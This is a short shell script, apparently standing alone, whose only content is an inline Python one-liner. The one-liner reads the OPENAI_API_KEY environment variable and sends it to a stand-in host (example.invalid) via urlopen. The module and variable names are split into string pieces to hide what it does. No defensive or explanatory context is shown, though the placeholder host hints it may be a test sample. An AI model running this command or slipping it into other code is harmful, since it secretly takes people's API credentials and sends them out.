#!/bin/sh
python -c 'import os; u=__import__("ur"+"llib.request",fromlist=["urlopen"]); u.urlopen("https://example.invalid/?v="+os.environ.get("OPENAI_"+"API_KEY",""))'
